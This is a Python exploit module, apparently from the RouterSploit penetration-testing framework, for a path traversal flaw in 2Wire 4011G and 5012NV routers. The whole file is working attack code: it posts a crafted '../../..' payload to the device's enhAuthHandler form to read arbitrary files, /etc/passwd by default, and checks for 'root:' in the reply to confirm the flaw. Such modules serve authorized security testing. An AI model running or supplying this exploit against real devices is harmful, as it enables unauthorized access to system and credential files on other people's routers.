from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    print_info,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for path traversal vulnerability in 2Wire 4011G and 5012NV  devices.
    If the target is vulnerable it is possible to read file from the filesystem."
    """
    __info__ = {
        'name': '2Wire 4011G & 5012NV Path Traversal',
        'description': 'Module exploits path traversal vulnerability in 2Wire 4011G and 5012NV devices. '
                       'If the target is vulnerable it is possible to read file from the filesystem.',
        'authors': [
            'adiaz',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.underground.org.mx/index.php?topic=28616.0',
        ],
        'devices': [
            '2Wire 4011G',
            '2Wire 5012NV',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port
    filename = exploits.Option('/etc/passwd', 'File to read from filesystem')

    def run(self):
        if self.check():
            print_success("Target is vulnerable")

            print_status("Sending read {} file request".format(self.filename))
            url = "{}:{}/goform/enhAuthHandler".format(self.target, self.port)

            headers = {u"Content-Type": u"application/x-www-form-urlencoded"}

            data = {"__ENH_SHOW_REDIRECT_PATH__": "/pages/C_4_0.asp/../../..{}".format(self.filename),
                    "__ENH_SUBMIT_VALUE_SHOW__": "Acceder",
                    "__ENH_ERROR_REDIRECT_PATH__": "",
                    "username": "tech"}

            response = http_request(method="POST", url=url, headers=headers, data=data)
            if response is None:
                return

            print_status("Reading file {}".format(self.filename))
            print_info(response.text)
        else:
            print_error("Target seems to be not vulnerable")

    @mute
    def check(self):
        url = "{}:{}/goform/enhAuthHandler".format(self.target, self.port)

        headers = {u"Content-Type": u"application/x-www-form-urlencoded"}

        data = {"__ENH_SHOW_REDIRECT_PATH__": "/pages/C_4_0.asp/../../../etc/passwd",
                "__ENH_SUBMIT_VALUE_SHOW__": "Acceder",
                "__ENH_ERROR_REDIRECT_PATH__": "",
                "username": "tech"}

        response = http_request(method="POST", url=url, headers=headers, data=data)
        if response is None:
            return False  # target is not vulnerable

        if "root:" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
